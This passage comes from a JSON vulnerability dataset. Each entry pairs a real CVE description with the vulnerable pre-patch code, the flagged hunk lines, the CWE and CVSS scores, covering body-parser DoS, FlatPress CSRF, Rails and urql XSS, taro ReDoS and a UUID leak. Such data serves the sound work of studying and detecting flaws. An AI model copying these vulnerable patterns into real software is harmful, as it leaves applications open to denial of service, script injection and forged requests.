        "def validate_translation_file(po_file):\n    \"\"\"\n    Validate a translation file and return errors if any.\n\n    This function combines both stderr and stdout output of the `msgfmt` in a\n    single variable.\n    \"\"\"\n    completed_process = subprocess.run(\n        ['msgfmt', '-v', '--strict', '--check', po_file],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n    )\n\n    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n\n    return {\n        'valid': completed_process.returncode == 0,\n        'output': f'{stdout}\\n{stderr}',\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 38,
          "content": "    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')"
        },
        {
          "line_no": 39,
          "content": "    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')"
        },
        {
          "line_no": 42,
          "content": "        'valid': completed_process.returncode == 0,"
        },
        {
          "line_no": 43,
          "content": "        'output': f'{stdout}\\n{stderr}',"
        }
      ]
    },
    "cwe": [
      "CWE-74"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 3.1
  },
  {
    "id": 1170,
    "cve": "CVE-2024-45590",
    "description": "body-parser is Node.js body parsing middleware. body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service. This issue is patched in 1.20.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/types/urlencoded.js",
          "content": "/*!\n * body-parser\n * Copyright(c) 2014 Jonathan Ong\n * Copyright(c) 2014-2015 Douglas Christopher Wilson\n * MIT Licensed\n */\n\n'use strict'\n\n/**\n * Module dependencies.\n * @private\n */\n\nvar bytes = require('bytes')\nvar contentType = require('content-type')\nvar createError = require('http-errors')\nvar debug = require('debug')('body-parser:urlencoded')\nvar deprecate = require('depd')('body-parser')\nvar read = require('../read')\nvar typeis = require('type-is')\n\n/**\n * Module exports.\n */\n\nmodule.exports = urlencoded\n\n/**\n * Cache of parser modules.\n */\n\nvar parsers = Object.create(null)\n\n/**\n * Create a middleware to parse urlencoded bodies.\n *\n * @param {object} [options]\n * @return {function}\n * @public\n */\n\nfunction urlencoded (options) {\n  var opts = options || {}\n\n  // notice because option default will flip in next major\n  if (opts.extended === undefined) {\n    deprecate('undefined extended: provide extended option')\n  }\n\n  var extended = opts.extended !== false\n  var inflate = opts.inflate !== false\n  var limit = typeof opts.limit !== 'number'\n    ? bytes.parse(opts.limit || '100kb')\n    : opts.limit\n  var type = opts.type || 'application/x-www-form-urlencoded'\n  var verify = opts.verify || false\n\n  if (verify !== false && typeof verify !== 'function') {\n    throw new TypeError('option verify must be function')\n  }\n\n  // create the appropriate query parser\n  var queryparse = extended\n    ? extendedparser(opts)\n    : simpleparser(opts)\n\n  // create the appropriate type checking function\n  var shouldParse = typeof type !== 'function'\n    ? typeChecker(type)\n    : type\n\n  function parse (body) {\n    return body.length\n      ? queryparse(body)\n      : {}\n  }\n\n  return function urlencodedParser (req, res, next) {\n    if (req._body) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    req.body = req.body || {}\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next()\n      return\n    }\n\n    // assert charset\n    var charset = getCharset(req) || 'utf-8'\n    if (charset !== 'utf-8') {\n      debug('invalid charset')\n      next(createError(415, 'unsupported charset \"' + charset.toUpperCase() + '\"', {\n        charset: charset,\n        type: 'charset.unsupported'\n      }))\n      return\n    }\n\n    // read\n    read(req, res, next, parse, debug, {\n      debug: debug,\n      encoding: charset,\n      inflate: inflate,\n      limit: limit,\n      verify: verify\n    })\n  }\n}\n\n/**\n * Get the extended query parser.\n *\n * @param {object} options\n */\n\nfunction extendedparser (options) {\n  var parameterLimit = options.parameterLimit !== undefined\n    ? options.parameterLimit\n    : 1000\n  var parse = parser('qs')\n\n  if (isNaN(parameterLimit) || parameterLimit < 1) {\n    throw new TypeError('option parameterLimit must be a positive number')\n  }\n\n  if (isFinite(parameterLimit)) {\n    parameterLimit = parameterLimit | 0\n  }\n\n  return function queryparse (body) {\n    var paramCount = parameterCount(body, parameterLimit)\n\n    if (paramCount === undefined) {\n      debug('too many parameters')\n      throw createError(413, 'too many parameters', {\n        type: 'parameters.too.many'\n      })\n    }\n\n    var arrayLimit = Math.max(100, paramCount)\n\n    debug('parse extended urlencoding')\n    return parse(body, {\n      allowPrototypes: true,\n      arrayLimit: arrayLimit,\n      depth: Infinity,\n      parameterLimit: parameterLimit\n    })\n  }\n}\n\n/**\n * Get the charset of a request.\n *\n * @param {object} req\n * @api private\n */\n\nfunction getCharset (req) {\n  try {\n    return (contentType.parse(req).parameters.charset || '').toLowerCase()\n  } catch (e) {\n    return undefined\n  }\n}\n\n/**\n * Count the number of parameters, stopping once limit reached\n *\n * @param {string} body\n * @param {number} limit\n * @api private\n */\n\nfunction parameterCount (body, limit) {\n  var count = 0\n  var index = 0\n\n  while ((index = body.indexOf('&', index)) !== -1) {\n    count++\n    index++\n\n    if (count === limit) {\n      return undefined\n    }\n  }\n\n  return count\n}\n\n/**\n * Get parser for module name dynamically.\n *\n * @param {string} name\n * @return {function}\n * @api private\n */\n\nfunction parser (name) {\n  var mod = parsers[name]\n\n  if (mod !== undefined) {\n    return mod.parse\n  }\n\n  // this uses a switch for static require analysis\n  switch (name) {\n    case 'qs':\n      mod = require('qs')\n      break\n    case 'querystring':\n      mod = require('querystring')\n      break\n  }\n\n  // store to prevent invoking require()\n  parsers[name] = mod\n\n  return mod.parse\n}\n\n/**\n * Get the simple query parser.\n *\n * @param {object} options\n */\n\nfunction simpleparser (options) {\n  var parameterLimit = options.parameterLimit !== undefined\n    ? options.parameterLimit\n    : 1000\n  var parse = parser('querystring')\n\n  if (isNaN(parameterLimit) || parameterLimit < 1) {\n    throw new TypeError('option parameterLimit must be a positive number')\n  }\n\n  if (isFinite(parameterLimit)) {\n    parameterLimit = parameterLimit | 0\n  }\n\n  return function queryparse (body) {\n    var paramCount = parameterCount(body, parameterLimit)\n\n    if (paramCount === undefined) {\n      debug('too many parameters')\n      throw createError(413, 'too many parameters', {\n        type: 'parameters.too.many'\n      })\n    }\n\n    debug('parse urlencoding')\n    return parse(body, undefined, undefined, { maxKeys: parameterLimit })\n  }\n}\n\n/**\n * Get the simple type checker.\n *\n * @param {string} type\n * @return {function}\n */\n\nfunction typeChecker (type) {\n  return function checkType (req) {\n    return Boolean(typeis(req, type))\n  }\n}\n"
        }
      ],
      "method_level": [
        "function urlencoded (options) {\n  var opts = options || {}\n\n  // notice because option default will flip in next major\n  if (opts.extended === undefined) {\n    deprecate('undefined extended: provide extended option')\n  }\n\n  var extended = opts.extended !== false\n  var inflate = opts.inflate !== false\n  var limit = typeof opts.limit !== 'number'\n    ? bytes.parse(opts.limit || '100kb')\n    : opts.limit\n  var type = opts.type || 'application/x-www-form-urlencoded'\n  var verify = opts.verify || false\n\n  if (verify !== false && typeof verify !== 'function') {\n    throw new TypeError('option verify must be function')\n  }\n\n  // create the appropriate query parser\n  var queryparse = extended\n    ? extendedparser(opts)\n    : simpleparser(opts)\n\n  // create the appropriate type checking function\n  var shouldParse = typeof type !== 'function'\n    ? typeChecker(type)\n    : type\n\n  function parse (body) {\n    return body.length\n      ? queryparse(body)\n      : {}\n  }\n\n  return function urlencodedParser (req, res, next) {\n    if (req._body) {\n      debug('body already parsed')\n      next()\n      return\n    }\n\n    req.body = req.body || {}\n\n    // skip requests without bodies\n    if (!typeis.hasBody(req)) {\n      debug('skip empty body')\n      next()\n      return\n    }\n\n    debug('content-type %j', req.headers['content-type'])\n\n    // determine if request should be parsed\n    if (!shouldParse(req)) {\n      debug('skip parsing')\n      next()\n      return\n    }\n\n    // assert charset\n    var charset = getCharset(req) || 'utf-8'\n    if (charset !== 'utf-8') {\n      debug('invalid charset')\n      next(createError(415, 'unsupported charset \"' + charset.toUpperCase() + '\"', {\n        charset: charset,\n        type: 'charset.unsupported'\n      }))\n      return\n    }\n\n    // read\n    read(req, res, next, parse, debug, {\n      debug: debug,\n      encoding: charset,\n      inflate: inflate,\n      limit: limit,\n      verify: verify\n    })\n  }\n}",
        "function extendedparser (options) {\n  var parameterLimit = options.parameterLimit !== undefined\n    ? options.parameterLimit\n    : 1000\n  var parse = parser('qs')\n\n  if (isNaN(parameterLimit) || parameterLimit < 1) {\n    throw new TypeError('option parameterLimit must be a positive number')\n  }\n\n  if (isFinite(parameterLimit)) {\n    parameterLimit = parameterLimit | 0\n  }\n\n  return function queryparse (body) {\n    var paramCount = parameterCount(body, parameterLimit)\n\n    if (paramCount === undefined) {\n      debug('too many parameters')\n      throw createError(413, 'too many parameters', {\n        type: 'parameters.too.many'\n      })\n    }\n\n    var arrayLimit = Math.max(100, paramCount)\n\n    debug('parse extended urlencoding')\n    return parse(body, {\n      allowPrototypes: true,\n      arrayLimit: arrayLimit,\n      depth: Infinity,\n      parameterLimit: parameterLimit\n    })\n  }\n}"
      ],
      "hunk_level": [
        {
          "line_no": 121,
          "content": "      verify: verify"
        },
        {
          "line_no": 159,
          "content": "    return parse(body, {"
        },
        {
          "line_no": 160,
          "content": "      allowPrototypes: true,"
        },
        {
          "line_no": 161,
          "content": "      arrayLimit: arrayLimit,"
        },
        {
          "line_no": 162,
          "content": "      depth: Infinity,"
        },
        {
          "line_no": 163,
          "content": "      parameterLimit: parameterLimit"
        },
        {
          "line_no": 164,
          "content": "    })"
        }
      ]
    },
    "cwe": [
      "CWE-405"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 1408,
    "cve": "CVE-2024-9847",
    "description": "FlatPress CMS version latest is vulnerable to Cross-Site Request Forgery (CSRF) attacks that allow an attacker to enable or disable plugins on behalf of a victim user. The attacker can craft a malicious link or script that, when clicked by an authenticated user, will send a request to the FlatPress CMS server to perform the desired action on behalf of the victim user. Since the request is authenticated, the server will process it as if it were initiated by the legitimate user, effectively allowing the attacker to perform unauthorized actions. This vulnerability is fixed in version 1.4.dev.",
    "vulnerability": {
      "file_level": [
        {
          "name": "admin/panels/static/admin.static.delete.php",
          "content": "<?php\n\n/**\n * static delete panel\n *\n * Type:     \n * Name:     \n * Date:     \n * Purpose:  \n * Input:\n *         \n * @author NoWhereMan <real_nowhereman at users dot sf dot com>\n *\n */\n\n\n\tclass admin_static_delete extends AdminPanelAction {\n\n\t\tvar $events = array('delete', 'cancel');\n\t\tvar $page;\n\n\t\tfunction setup() {\n\t\t\t$this->page = isset($_REQUEST ['page']) ? sanitize_text_field($_REQUEST ['page']) : null;\n\t\t\t$this->smarty->assign('pageid', $this->page);\n\t\t}\n\n\t\tfunction main() {\n\n\t\t\tif ($this->page) {\n\t\t\t\t$arr = static_parse($this->page);\n\n\t\t\t\tif (THEME_LEGACY_MODE) {\n\t\t\t\t\ttheme_entry_filters($arr, null);\n\t\t\t\t}\n\n\t\t\t\t$this->smarty->assign('entry', $arr);\n\t\t\t} else {\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t}\n\n\n\t\tfunction ondelete() {\n\t\t\t$id=$this->page;\n\t\t\t$success=static_delete($id);\n\t\t\t$this->smarty->assign('success', $success? 2 : -2);\n\t\t\treturn 1;\n\t\t}\n\n\t\tfunction oncancel() {\n\t\t\treturn 1;\n\t\t}\n\n\t}\n?>\n"
        }
      ],
      "method_level": [
        "function setup() {\n\t\t\t$this->page = isset($_REQUEST ['page']) ? sanitize_text_field($_REQUEST ['page']) : null;\n\t\t\t$this->smarty->assign('pageid', $this->page);\n\t\t}",
        "function main() {\n\n\t\t\tif ($this->page) {\n\t\t\t\t$arr = static_parse($this->page);\n\n\t\t\t\tif (THEME_LEGACY_MODE) {\n\t\t\t\t\ttheme_entry_filters($arr, null);\n\t\t\t\t}\n\n\t\t\t\t$this->smarty->assign('entry', $arr);\n\t\t\t} else {\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t}",
        "function ondelete() {\n\t\t\t$id=$this->page;\n\t\t\t$success=static_delete($id);\n\t\t\t$this->smarty->assign('success', $success? 2 : -2);\n\t\t\treturn 1;\n\t\t}",
        "function oncancel() {\n\t\t\treturn 1;\n\t\t}"
      ],
      "hunk_level": [
        {
          "line_no": 22,
          "content": "\t\tfunction setup() {"
        },
        {
          "line_no": 23,
          "content": "\t\t\t$this->page = isset($_REQUEST ['page']) ? sanitize_text_field($_REQUEST ['page']) : null;"
        },
        {
          "line_no": 24,
          "content": "\t\t\t$this->smarty->assign('pageid', $this->page);"
        },
        {
          "line_no": 25,
          "content": "\t\t}"
        },
        {
          "line_no": 27,
          "content": "\t\tfunction main() {"
        },
        {
          "line_no": 29,
          "content": "\t\t\tif ($this->page) {"
        },
        {
          "line_no": 30,
          "content": "\t\t\t\t$arr = static_parse($this->page);"
        },
        {
          "line_no": 32,
          "content": "\t\t\t\tif (THEME_LEGACY_MODE) {"
        },
        {
          "line_no": 33,
          "content": "\t\t\t\t\ttheme_entry_filters($arr, null);"
        },
        {
          "line_no": 34,
          "content": "\t\t\t\t}"
        },
        {
          "line_no": 36,
          "content": "\t\t\t\t$this->smarty->assign('entry', $arr);"
        },
        {
          "line_no": 37,
          "content": "\t\t\t} else {"
        },
        {
          "line_no": 38,
          "content": "\t\t\t\treturn 1;"
        },
        {
          "line_no": 44,
          "content": "\t\tfunction ondelete() {"
        },
        {
          "line_no": 45,
          "content": "\t\t\t$id=$this->page;"
        },
        {
          "line_no": 46,
          "content": "\t\t\t$success=static_delete($id);"
        },
        {
          "line_no": 47,
          "content": "\t\t\t$this->smarty->assign('success', $success? 2 : -2);"
        },
        {
          "line_no": 48,
          "content": "\t\t\treturn 1;"
        },
        {
          "line_no": 49,
          "content": "\t\t}"
        },
        {
          "line_no": 51,
          "content": "\t\tfunction oncancel() {"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "HIGH",
    "cvss_score": 8.0,
    "cvss_version": 3.0
  },
  {
    "id": 375,
    "cve": "CVE-2024-26143",
    "description": "Rails is a web-application framework. There is a possible XSS vulnerability when using the translation helpers in Action Controller. Applications using translation methods like translate, or t on a controller, with a key ending in \"_html\", a :default key which contains untrusted user input, and the resulting string is used in a view, may be susceptible to an XSS vulnerability. The vulnerability is fixed in 7.1.3.1 and 7.0.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "actionpack/lib/abstract_controller/translation.rb",
          "content": "# frozen_string_literal: true\n\nrequire \"active_support/html_safe_translation\"\n\nmodule AbstractController\n  module Translation\n    mattr_accessor :raise_on_missing_translations, default: false\n\n    # Delegates to <tt>I18n.translate</tt>.\n    #\n    # When the given key starts with a period, it will be scoped by the current\n    # controller and action. So if you call <tt>translate(\".foo\")</tt> from\n    # <tt>PeopleController#index</tt>, it will convert the call to\n    # <tt>I18n.translate(\"people.index.foo\")</tt>. This makes it less repetitive\n    # to translate many keys within the same controller / action and gives you a\n    # simple framework for scoping them consistently.\n    def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      i18n_raise = options.fetch(:raise, self.raise_on_missing_translations)\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options, raise: i18n_raise)\n    end\n    alias :t :translate\n\n    # Delegates to <tt>I18n.localize</tt>.\n    def localize(object, **options)\n      I18n.localize(object, **options)\n    end\n    alias :l :localize\n  end\nend\n"
        }
      ],
      "method_level": [
        "def translate(key, **options)\n      if key&.start_with?(\".\")\n        path = controller_path.tr(\"/\", \".\")\n        defaults = [:\"#{path}#{key}\"]\n        defaults << options[:default] if options[:default]\n        options[:default] = defaults.flatten\n        key = \"#{path}.#{action_name}#{key}\"\n      end\n\n      i18n_raise = options.fetch(:raise, self.raise_on_missing_translations)\n\n      ActiveSupport::HtmlSafeTranslation.translate(key, **options, raise: i18n_raise)\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 28,
          "content": "      ActiveSupport::HtmlSafeTranslation.translate(key, **options, raise: i18n_raise)"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 185,
    "cve": "CVE-2024-24556",
    "description": "urql is a GraphQL client that exposes a set of helpers for several frameworks.  The `@urql/next` package is vulnerable to XSS. To exploit this an attacker would need to ensure that the response returns `html` tags and that the web-application is using streamed responses (non-RSC). This vulnerability is due to improper escaping of html-like characters in the response-stream. To fix this vulnerability upgrade to version 1.1.1",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/next-urql/src/DataHydrationContext.ts",
          "content": "import * as React from 'react';\nimport { ServerInsertedHTMLContext } from 'next/navigation';\nimport type { UrqlResult } from './useUrqlValue';\n\ninterface DataHydrationValue {\n  isInjecting: boolean;\n  operationValuesByKey: Record<number, UrqlResult>;\n  RehydrateScript: () =>\n    | React.DetailedReactHTMLElement<\n        { dangerouslySetInnerHTML: { __html: string } },\n        HTMLElement\n      >\n    | React.FunctionComponentElement<any>;\n}\n\nconst DataHydrationContext = React.createContext<\n  DataHydrationValue | undefined\n>(undefined);\n\nfunction transportDataToJS(data: any) {\n  const key = 'urql_transport';\n  return `(window[Symbol.for(\"${key}\")] ??= []).push(${JSON.stringify(data)})`;\n}\n\nexport const DataHydrationContextProvider = ({\n  nonce,\n  children,\n}: React.PropsWithChildren<{ nonce?: string }>) => {\n  const dataHydrationContext = React.useRef<DataHydrationValue>();\n  if (typeof window == 'undefined') {\n    if (!dataHydrationContext.current)\n      dataHydrationContext.current = buildContext({ nonce });\n  }\n\n  return React.createElement(\n    DataHydrationContext.Provider,\n    { value: dataHydrationContext.current },\n    children\n  );\n};\n\nexport function useDataHydrationContext(): DataHydrationValue | undefined {\n  const dataHydrationContext = React.useContext(DataHydrationContext);\n  const insertHtml = React.useContext(ServerInsertedHTMLContext);\n\n  if (typeof window !== 'undefined') return;\n\n  if (insertHtml && dataHydrationContext && !dataHydrationContext.isInjecting) {\n    dataHydrationContext.isInjecting = true;\n    insertHtml(() =>\n      React.createElement(dataHydrationContext.RehydrateScript, {})\n    );\n  }\n  return dataHydrationContext;\n}\n\nlet key = 0;\nfunction buildContext({ nonce }: { nonce?: string }): DataHydrationValue {\n  const dataHydrationContext: DataHydrationValue = {\n    isInjecting: false,\n    operationValuesByKey: {},\n    RehydrateScript() {\n      dataHydrationContext.isInjecting = false;\n      if (!Object.keys(dataHydrationContext.operationValuesByKey).length)\n        return React.createElement(React.Fragment);\n\n      const __html = transportDataToJS({\n        rehydrate: { ...dataHydrationContext.operationValuesByKey },\n      });\n\n      dataHydrationContext.operationValuesByKey = {};\n\n      return React.createElement('script', {\n        key: key++,\n        nonce: nonce,\n        dangerouslySetInnerHTML: { __html },\n      });\n    },\n  };\n\n  return dataHydrationContext;\n}\n"
        }
      ],
      "method_level": [
        "transportDataToJS"
      ],
      "hunk_level": [
        {
          "line_no": 22,
          "content": "  return `(window[Symbol.for(\"${key}\")] ??= []).push(${JSON.stringify(data)})`;"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.2,
    "cvss_version": 3.1
  },
  {
    "id": 182,
    "cve": "CVE-2025-5896",
    "description": "A vulnerability was found in tarojs taro up to 4.1.1. It has been declared as problematic. This vulnerability affects unknown code of the file taro/packages/css-to-react-native/src/index.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. Upgrading to version 4.1.2 is able to address this issue. The name of the patch is c2e321a8b6fc873427c466c69f41ed0b5e8814bf. It is recommended to upgrade the affected component.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/css-to-react-native/src/index.js",
          "content": "import parseCSS from 'css/lib/parse'\nimport mediaQuery from 'css-mediaquery'\n\nimport transformCSS from './css-to-react-native'\nimport {\n  dimensionFeatures,\n  mediaQueryFeatures,\n} from './transforms/media-queries/features'\nimport { mediaQueryTypes } from './transforms/media-queries/types'\nimport { remToPx } from './transforms/rem'\nimport { allEqual } from './utils/allEqual'\nimport { camelCase } from './utils/camelCase'\nimport { sortRules } from './utils/sortRules'\nimport { values } from './utils/values'\n\nconst lengthRe = /^(0$|(?:[+-]?(?:\\d*\\.)?\\d+(?:[Ee][+-]?\\d+)?)(?=px|rem$))/\nconst viewportUnitRe = /^([+-]?[0-9.]+)(vh|vw|vmin|vmax)$/\nconst percentRe = /^([+-]?(?:\\d*\\.)?\\d+(?:[Ee][+-]?\\d+)?%)$/\nconst unsupportedUnitRe =\n  /^([+-]?(?:\\d*\\.)?\\d+(?:[Ee][+-]?\\d+)?(ch|em|ex|cm|mm|in|pc|pt))$/\nconst shorthandBorderProps = [\n  'border-radius',\n  'border-width',\n  'border-color',\n  'border-style',\n]\n\nconst transformDecls = (styles, declarations, result, options = {}) => {\n  for (const d in declarations) {\n    const declaration = declarations[d]\n    if (declaration.type !== 'declaration') continue\n\n    const property = declaration.property\n    let value = remToPx(declaration.value)\n\n    const isLengthUnit = lengthRe.test(value)\n    const isViewportUnit = viewportUnitRe.test(value)\n    const isPercent = percentRe.test(value)\n    const isUnsupportedUnit = unsupportedUnitRe.test(value)\n\n    if (\n      property === 'line-height' &&\n      !isLengthUnit &&\n      !isViewportUnit &&\n      !isPercent &&\n      !isUnsupportedUnit\n    ) {\n      // ignore invalid value avoid throw error cause app crash\n      continue\n    }\n\n    if (!result.__viewportUnits && isViewportUnit) {\n      result.__viewportUnits = true\n    }\n    // scalable option, when it is false, transform single value 'px' unit to 'PX'\n    // do not be wrapped by scalePx2dp function\n    if (\n      typeof options.scalable === 'boolean' &&\n      !options.scalable &&\n      /(\\d+)px/.test(value)\n    ) {\n      value = value.replace(/(\\d+)px/g, '$1PX')\n    }\n    // expect value is legal so that remove !import\n    if (/!import/i.test(value)) {\n      value = value.replace(/!import/, '')\n    }\n\n    if (shorthandBorderProps.indexOf(property) > -1) {\n      // transform single value shorthand border properties back to\n      // shorthand form to support styling `Image`.\n      const transformed = transformCSS([[property, value]])\n      const vals = values(transformed)\n      if (allEqual(vals)) {\n        const replacement = {}\n        replacement[camelCase(property)] = vals[0]\n        Object.assign(styles, replacement)\n      } else {\n        Object.assign(styles, transformed)\n      }\n    } else {\n      Object.assign(styles, transformCSS([[property, value]]))\n    }\n  }\n}\n\nconst transform = (css, options) => {\n  const { stylesheet } = parseCSS(css)\n  const rules = sortRules(stylesheet.rules)\n\n  const result = {}\n\n  for (const r in rules) {\n    const rule = rules[r]\n    for (const s in rule.selectors) {\n      if (rule.selectors[s] === ':export') {\n        if (!result.__exportProps) {\n          result.__exportProps = {}\n        }\n\n        rule.declarations.forEach(({ property, value }) => {\n          const isAlreadyDefinedAsClass =\n            typeof result[property] !== 'undefined' &&\n            typeof result.__exportProps[property] === 'undefined'\n\n          if (isAlreadyDefinedAsClass) {\n            throw new Error(\n              `Failed to parse :export block because a CSS class in the same file is already using the name \"${property}\"`,\n            )\n          }\n\n          result.__exportProps[property] = value\n        })\n        continue\n      }\n\n      if (\n        rule.selectors[s].indexOf('.') !== 0 ||\n        rule.selectors[s].indexOf(':') !== -1 ||\n        rule.selectors[s].indexOf('[') !== -1 ||\n        rule.selectors[s].indexOf('~') !== -1 ||\n        rule.selectors[s].indexOf('>') !== -1 ||\n        rule.selectors[s].indexOf('+') !== -1 ||\n        rule.selectors[s].indexOf(' ') !== -1\n      ) {\n        continue\n      }\n\n      const selector = rule.selectors[s].replace(/^\\./, '')\n      const styles = (result[selector] = result[selector] || {})\n      transformDecls(styles, rule.declarations, result, options)\n    }\n\n    if (\n      rule.type === 'media' &&\n      options != null &&\n      options.parseMediaQueries === true\n    ) {\n      const parsed = mediaQuery.parse(rule.media)\n\n      parsed.forEach((mq) => {\n        if (mediaQueryTypes.indexOf(mq.type) === -1) {\n          throw new Error(`Failed to parse media query type \"${mq.type}\"`)\n        }\n\n        mq.expressions.forEach((e) => {\n          const mf = e.modifier ? `${e.modifier}-${e.feature}` : e.feature\n          const val = e.value ? `: ${e.value}` : ''\n\n          if (mediaQueryFeatures.indexOf(e.feature) === -1) {\n            throw new Error(`Failed to parse media query feature \"${mf}\"`)\n          }\n\n          if (\n            dimensionFeatures.indexOf(e.feature) > -1 &&\n            lengthRe.test(e.value) === false\n          ) {\n            throw new Error(\n              `Failed to parse media query expression \"(${mf}${val})\"`,\n            )\n          }\n        })\n      })\n\n      const media = '@media ' + rule.media\n\n      result.__mediaQueries = result.__mediaQueries || {}\n      result.__mediaQueries[media] = parsed\n\n      for (const r in rule.rules) {\n        const ruleRule = rule.rules[r]\n        for (const s in ruleRule.selectors) {\n          result[media] = result[media] || {}\n          const selector = ruleRule.selectors[s].replace(/^\\./, '')\n          const mediaStyles = (result[media][selector] =\n            result[media][selector] || {})\n          transformDecls(mediaStyles, ruleRule.declarations, result, options)\n        }\n      }\n    }\n  }\n\n  if (result.__exportProps) {\n    Object.assign(result, result.__exportProps)\n    delete result.__exportProps\n  }\n\n  return result\n}\n\nexport { transformCSS }\n\nexport default transform\n"
        },
        {
          "name": "packages/css-to-react-native/src/transforms/rem.js",
          "content": "export const remToPx = value => {\n  return value.replace(/(\\d*\\.?\\d+)rem/g, (match, m1) => parseFloat(m1, 10) * 16 + 'px')\n}\n"
        }
      ],
      "method_level": [
        "transformDecls = (styles, declarations, result, options = {}) => {\n  for (const d in declarations) {\n    const declaration = declarations[d]\n    if (declaration.type !== 'declaration') continue\n\n    const property = declaration.property\n    let value = remToPx(declaration.value)\n\n    const isLengthUnit = lengthRe.test(value)\n    const isViewportUnit = viewportUnitRe.test(value)\n    const isPercent = percentRe.test(value)\n    const isUnsupportedUnit = unsupportedUnitRe.test(value)\n\n    if (\n      property === 'line-height' &&\n      !isLengthUnit &&\n      !isViewportUnit &&\n      !isPercent &&\n      !isUnsupportedUnit\n    ) {\n      // ignore invalid value avoid throw error cause app crash\n      continue\n    }\n\n    if (!result.__viewportUnits && isViewportUnit) {\n      result.__viewportUnits = true\n    }\n    // scalable option, when it is false, transform single value 'px' unit to 'PX'\n    // do not be wrapped by scalePx2dp function\n    if (\n      typeof options.scalable === 'boolean' &&\n      !options.scalable &&\n      /(\\d+)px/.test(value)\n    ) {\n      value = value.replace(/(\\d+)px/g, '$1PX')\n    }\n    // expect value is legal so that remove !import\n    if (/!import/i.test(value)) {\n      value = value.replace(/!import/, '')\n    }\n\n    if (shorthandBorderProps.indexOf(property) > -1) {\n      // transform single value shorthand border properties back to\n      // shorthand form to support styling `Image`.\n      const transformed = transformCSS([[property, value]])\n      const vals = values(transformed)\n      if (allEqual(vals)) {\n        const replacement = {}\n        replacement[camelCase(property)] = vals[0]\n        Object.assign(styles, replacement)\n      } else {\n        Object.assign(styles, transformed)\n      }\n    } else {\n      Object.assign(styles, transformCSS([[property, value]]))\n    }\n  }\n}",
        "remToPx = value => {\n  return value.replace(/(\\d*\\.?\\d+)rem/g, (match, m1) => parseFloat(m1, 10) * 16 + 'px')\n}"
      ],
      "hunk_level": [
        {
          "line_no": 60,
          "content": "      /(\\d+)px/.test(value)"
        },
        {
          "line_no": 62,
          "content": "      value = value.replace(/(\\d+)px/g, '$1PX')"
        },
        {
          "line_no": 2,
          "content": "  return value.replace(/(\\d*\\.?\\d+)rem/g, (match, m1) => parseFloat(m1, 10) * 16 + 'px')"
        }
      ]
    },
    "cwe": [
      "CWE-400",
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 72,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.2\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = 